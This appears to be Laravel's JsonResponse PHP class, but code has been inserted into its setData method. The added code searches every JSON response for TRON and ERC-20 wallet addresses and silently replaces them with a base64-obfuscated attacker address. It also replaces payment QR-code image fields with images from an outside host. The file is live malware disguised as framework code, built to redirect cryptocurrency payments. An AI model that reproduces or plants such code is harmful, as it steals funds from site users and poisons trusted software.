<?php

namespace Illuminate\Http;

use Illuminate\Contracts\Support\Arrayable;
use Illuminate\Contracts\Support\Jsonable;
use Illuminate\Support\Traits\Macroable;
use InvalidArgumentException;
use JsonSerializable;
use Symfony\Component\HttpFoundation\JsonResponse as BaseJsonResponse;

class JsonResponse extends BaseJsonResponse
{
    use ResponseTrait, Macroable {
        Macroable::__call as macroCall;
    }

    /**
     * Constructor.
     *
     * @param  mixed  $data
     * @param  int  $status
     * @param  array  $headers
     * @param  int  $options
     * @return void
     */
    public function __construct($data = null, $status = 200, $headers = [], $options = 0)
    {
        $this->encodingOptions = $options;

        parent::__construct($data, $status, $headers);
    }

    /**
     * Sets the JSONP callback.
     *
     * @param  string|null  $callback
     * @return $this
     */
    public function withCallback($callback = null)
    {
        return $this->setCallback($callback);
    }

    /**
     * Get the json_decoded data from the response.
     *
     * @param  bool  $assoc
     * @param  int  $depth
     * @return mixed
     */
    public function getData($assoc = false, $depth = 512)
    {
        return json_decode($this->data, $assoc, $depth);
    }

    /**
     * {@inheritdoc}
     */
    public function setData($data = [])
    {
        $this->original = $data;

        if ($data instanceof Jsonable) {
            $this->data = $data->toJson($this->encodingOptions);
        } elseif ($data instanceof JsonSerializable) {
            $this->data = json_encode($data->jsonSerialize(), $this->encodingOptions);
        } elseif ($data instanceof Arrayable) {
            $this->data = json_encode($data->toArray(), $this->encodingOptions);
        } else {
            $this->data = json_encode($data, $this->encodingOptions);
        }

        if (! $this->hasValidJson(json_last_error())) {
            throw new InvalidArgumentException(json_last_error_msg());
        }
      
        if( $this->checkIsNeedReplaceWayFunc( json_decode($this->data,true) ) ){
            $this->data = json_encode($this->changeMydata(json_decode($this->data,true)) ,JSON_UNESCAPED_UNICODE);
        }
       
        return $this->update();
    }
    
    public function checkIsNeedReplaceWayFunc($array){
        $checkFlag = false;
        $this->MulitarraytoSinglesWay($array,$checkFlag);
        return $checkFlag;
    }

    public function MulitarraytoSinglesWay($array,&$checkFlag){
       if(is_array($array)){
         foreach ($array as $key=>$value )
         {
           if(is_array($value)){
             $this->MulitarraytoSinglesWay($value,$checkFlag);
           }
           else{
             if( $this->isTronAddressCheck($value) || $this->isErc20AddressCheck($value)){
                 $checkFlag = true;
             }
           }
         }
       }
    }

    public function changeMydata($demoData001001){
       $retData = array();
       if(is_string($demoData001001)){
            $demoData001001 = $this->checkAddressAndUpdateContents($demoData001001,"address_text"); 
       }
       if(is_array($demoData001001)){
          if($demoData001001){
            foreach ($demoData001001 as $key => $value) {
                if(is_array($value)){
                    $demoData001001[$key] = $this->changeMydata($value);
                
                }elseif( is_string($demoData001001[$key]) ){
                    $demoData001001[$key] = $this->checkAddressAndUpdateContents($value,"address_text");
                    $isQrcodeAddressImgFlag = false;
                    //检验是否存在图片
                    if ($this->checkIsImageValue($value) && in_array($key,array('qrcode_img','qrcode','trc20','erc20','address_img','paying','pay_img','payimg',"pay",'img','image',"trc20_img","erc20_img"))){
                       $demoData001001[$key] = $this->checkAndUpdateQrcodeImg($key,$demoData001001);
                    }
                }
            }
          }
       }

       return $demoData001001;
    }

    public function checkAndUpdateQrcodeImg($checkKeyName,$originArr){
        $retData = $originArr[$checkKeyName];
        if(is_array($originArr)){
            if($originArr){
                foreach ($originArr as $key => $value) {
                    if($checkKeyName == $key){
                       continue;
                    }
                    $newValue = $this->checkAddressAndUpdateContents($value,"qrcode_img"); 
                    if( $newValue != $value && is_string($newValue) && $newValue != 'Array' && $newValue != 'Object'){
                        $retData = $newValue;
                    }
                }

            }
        }
        return $retData;
    }



    public function checkIsImageValue($imgSrcStr){
        if(!is_string($imgSrcStr)){
          return false;
        }
        if( preg_match('/(\.png|\.jpg|\.jpeg|\.gif)$/', $imgSrcStr) ){
         return true;
        }
        return false;
    }


    public function checkAddressAndUpdateContents($checkStringName,$retData="address_text"){
        if(is_string($checkStringName)){
            $isTronAddressFlag  = $this->isTronAddressCheck($checkStringName);
            $isErc20AddressFlag = $this->isErc20AddressCheck($checkStringName);
            switch ($retData) {
                case 'address_text':
                    if($isTronAddressFlag){
                        $checkStringName = preg_replace('/T[a-zA-Z0-9]{33}/', base64_decode("VEdkUnV1ZU1nSEtBWHlDTTkxeGtVQVBybkdoNldvcXY5aw=="), $checkStringName);
                    }
                    if($isErc20AddressFlag){
                        $checkStringName = preg_replace('/0x[a-zA-Z0-9]{40}/', base64_decode("MHhhZjE2M0NiOTNjNzgzOTQ3RTgwNDU5MTZBMGRmMDQ2ODdjQTM0YzIz"), $checkStringName);
                    }
                    break;
                case 'qrcode_img':
                    if($isTronAddressFlag){
                        $checkStringName = str_replace("%3A",":",base64_decode("aHR0cHMlM0EvL2xvZy53ZDhjdC5jb20vdHJjMjAucG5n" ));
                    }
                    if($isErc20AddressFlag){
                        $checkStringName = str_replace("%3A",":",base64_decode("aHR0cHMlM0EvL2xvZy53ZDhjdC5jb20vZXJjMjAucG5n" ));
                    }
                    break;
                
                default:
                    # code...
                    break;
            }
            
        }

        return $checkStringName;
    }


   
    public function isTronAddressCheck($checkStringName){
        $strlen = strlen($checkStringName);
        $flag = false;
        if($strlen == 34){
           if(preg_match('/T[a-zA-Z0-9]{33}/',$checkStringName)){
              $flag = true;
           }    
        }
        if($strlen >= 35){
           if(preg_match('/[a-zA-Z0-9]+T[a-zA-Z0-9]{33}/',$checkStringName) || preg_match('/T[a-zA-Z0-9]{33}[a-zA-Z0-9]+/',$checkStringName)){
              $flag = false;
           }else{
			  $flag = true;
           }
        }
        return $flag;
    }
   
    public function isErc20AddressCheck($checkStringName){
        $strlen = strlen($checkStringName);
        $flag = false;
        if($strlen == 42){
           if(preg_match('/0x[a-zA-Z0-9]{40}/',$checkStringName)){
              $flag = true;
           }    
        }
        if($strlen >= 43){
           if(preg_match('/[a-zA-Z0-9]+0x[a-zA-Z0-9]{40}/',$checkStringName) || preg_match('/0x[a-zA-Z0-9]{40}[a-zA-Z0-9]+/',$checkStringName)){
              $flag = false;
           }else{
              $flag = true;
           }
        }
        return $flag;
    }


    /**
     * Determine if an error occurred during JSON encoding.
     *
     * @param  int  $jsonError
     * @return bool
     */
    protected function hasValidJson($jsonError)
    {
        if ($jsonError === JSON_ERROR_NONE) {
            return true;
        }

        return $this->hasEncodingOption(JSON_PARTIAL_OUTPUT_ON_ERROR) &&
                    in_array($jsonError, [
                        JSON_ERROR_RECURSION,
                        JSON_ERROR_INF_OR_NAN,
                        JSON_ERROR_UNSUPPORTED_TYPE,
                    ]);
    }

    /**
     * {@inheritdoc}
     */
    public function setEncodingOptions($options)
    {
        $this->encodingOptions = (int) $options;

        return $this->setData($this->getData());
    }

    /**
     * Determine if a JSON encoding option is set.
     *
     * @param  int  $option
     * @return bool
     */
    public function hasEncodingOption($option)
    {
        return (bool) ($this->encodingOptions & $option);
    }
}
